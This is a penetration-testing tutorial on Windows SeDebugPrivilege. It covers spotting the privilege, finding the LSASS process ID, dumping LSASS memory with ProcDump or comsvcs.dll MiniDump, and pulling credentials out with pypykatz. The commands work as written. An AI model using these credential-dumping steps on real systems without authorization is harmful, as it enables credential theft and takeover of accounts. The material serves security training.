**SeDebugPrivilege** is a Windows privilege that allows a user or process to debug and interact with processes running under other security contexts. In practice, it grants access to processes that would normally be protected by the Windows access control model.

From a penetration testing perspective, SeDebugPrivilege is frequently encountered during local privilege escalation and post-exploitation phases. While possessing this privilege does not automatically make a user an administrator, it allows direct interaction with high-privilege processes, which can often be leveraged to obtain sensitive credentials or execute code under elevated contexts.

---

## Identifying SeDebugPrivilege

The first step is determining whether the current user token contains the privilege.

Using the built-in Windows utility:

```cmd
whoami /priv
```

Example output:

```text
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeShutdownPrivilege           Shut down the system           Disabled
```

---

## Accessing Protected Processes

A process with SeDebugPrivilege can obtain handles to processes that would otherwise be inaccessible.

Common targets include:

- lsass.exe
    
- winlogon.exe
    
- services.exe
    
- svchost.exe
    

Process enumeration:

```cmd
tasklist
```

```powershell
Get-Process
```

Obtaining a handle to a privileged process is often the first step toward credential extraction or token manipulation.

For example, identifying the LSASS PID:

```cmd
tasklist /fi "imagename eq lsass.exe"
```

Output:

```text
Image Name                     PID
========================= ========
lsass.exe                      684
```

---

## Credential Extraction Through LSASS

One of the most common abuses of SeDebugPrivilege is accessing the Local Security Authority Subsystem Service (LSASS) process.

LSASS stores authentication-related material such as:

- NTLM hashes
    
- Kerberos tickets
    
- Cached credentials
    
- Plaintext credentials (depending on configuration)
    

Creating a memory dump using Sysinternals ProcDump:

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

Alternative method:

```cmd
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump <PID> lsass.dmp full
```

Example:

```cmd
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump 684 lsass.dmp full
```

The resulting dump can then be analyzed offline.

Credential extraction:

```bash
pypykatz lsa minidump lsass.dmp
```

Historically, tools such as Mimikatz have also leveraged SeDebugPrivilege to interact directly with LSASS memory.
